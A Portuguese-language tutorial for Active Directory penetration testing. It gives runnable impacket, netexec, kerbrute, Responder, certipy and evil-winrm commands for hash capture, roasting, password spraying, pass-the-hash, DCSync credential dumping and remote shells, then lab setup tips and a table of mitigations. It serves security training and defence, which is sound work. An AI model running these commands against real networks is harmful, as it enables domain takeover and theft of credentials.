# 🏰 Active Directory — Metodologia de Ataque

> Guia da fase **`ad`** do arsenal (`./tools/setup-arsenal.sh ad`). AD é a espinha
> dorsal da maioria das redes corporativas — e a maior superfície de ataque real.

> ⚠️ **Só em domínio seu / lab / autorizado.** Estas técnicas comprometem redes
> Windows inteiras. Monte um lab (ver final) e pratique lá.

---

## Ferramentas da fase `ad`

| Ferramenta | Para quê |
|---|---|
| **impacket** (`secretsdump.py`, `GetUserSPNs.py`, `GetNPUsers.py`, `psexec.py`, `ntlmrelayx.py`…) | o canivete suíço de AD/SMB/Kerberos |
| **netexec** (`nxc`) | enumeração + spray + execução em massa (SMB/WinRM/LDAP/MSSQL) |
| **kerbrute** | enumeração de usuários + password spray via Kerberos (silencioso) |
| **bloodhound-python** | coleta dados do AD → mapa de **caminhos de ataque** |
| **certipy** | abuso de AD CS (ESC1–ESC8) |
| **Responder** | envenenamento LLMNR/NBT-NS → captura de hashes NetNTLM |
| **ldapdomaindump** | dump completo de usuários/grupos/computadores via LDAP |
| **evil-winrm** | shell interativo via WinRM (pós-credencial) |

---

## Fluxo (kill chain de AD)

### 1. Sem credencial ainda (acesso à rede)
```bash
# Envenenamento LLMNR/NBT-NS → captura hashes NetNTLMv2 de quem "erra" um nome
sudo Responder -I eth0

# Enumeração de usuários via Kerberos (não gera logon falho)
kerbrute userenum -d dominio.local --dc DC_IP users.txt

# AS-REP roasting (usuários sem pré-autenticação Kerberos)
GetNPUsers.py dominio.local/ -dc-ip DC_IP -usersfile users.txt -no-pass
```
→ Hashes capturados vão pro `hashcat` (fase `password`): `hashcat -m 5600 hashes rockyou.txt` (NetNTLMv2) / `-m 18200` (AS-REP).

### 2. Com credencial de baixo privilégio
```bash
# Mapeia tudo: o que essa conta alcança
nxc smb DC_IP -u user -p pass --shares
ldapdomaindump -u 'dominio\user' -p pass DC_IP

# Kerberoasting: pega hashes de contas de serviço (SPN)
GetUserSPNs.py dominio.local/user:pass -dc-ip DC_IP -request
# → hashcat -m 13100

# BloodHound: coleta e visualiza caminhos até Domain Admin
bloodhound-python -d dominio.local -u user -p pass -c All -ns DC_IP
# importe o .json no BloodHound GUI e rode "Shortest Path to Domain Admins"
```

### 3. Escalада / movimento lateral
```bash
# Password spray (1 senha, muitos usuários — cuidado com lockout!)
nxc smb DC_IP -u users.txt -p 'Verao2024!' --continue-on-success

# Pass-the-Hash
nxc smb ALVO -u admin -H <NTLM_HASH>
psexec.py dominio/admin@ALVO -hashes :<NTLM_HASH>

# AD CS (se vulnerável a ESC1)
certipy find -u user@dominio.local -p pass -dc-ip DC_IP -vulnerable
```

### 4. Domínio dominado
```bash
# Dump de TODAS as credenciais do domínio (DCSync) — precisa de privilégio alto
secretsdump.py dominio.local/admin:pass@DC_IP

# Shell interativo via WinRM
evil-winrm -i ALVO -u admin -H <NTLM_HASH>
```

---

## 🧪 Montar um lab de AD (no seu PC)
- **GOAD** (Game of Active Directory) — lab AD vulnerável pronto (Vagrant/Ansible): `github.com/Orange-Cyberdefense/GOAD`.
- **Detection Lab** ou um **Windows Server** (avaliação grátis) promovido a DC + uns Windows 10 no mesmo domínio, em rede **host-only**.
- Pratique a cadeia: foothold → roast → BloodHound → lateral → DCSync.

## 🛡️ Defesa (o lado que importa)
| Ataque | Mitigação |
|---|---|
| LLMNR/NBT-NS poisoning | desabilitar LLMNR/NBT-NS; SMB signing |
| Kerberoasting | senhas fortes/gMSA em contas de serviço; monitorar TGS |
| AS-REP roasting | exigir pré-autenticação Kerberos |
| Pass-the-Hash | LAPS, Credential Guard, Tier model |
| AD CS (ESCx) | revisar templates de certificado, EKUs, permissões |
| DCSync | restringir `Replicating Directory Changes`, monitorar |

> Estude BloodHound também como **defensor**: ele mostra os caminhos que você
> precisa **cortar**.
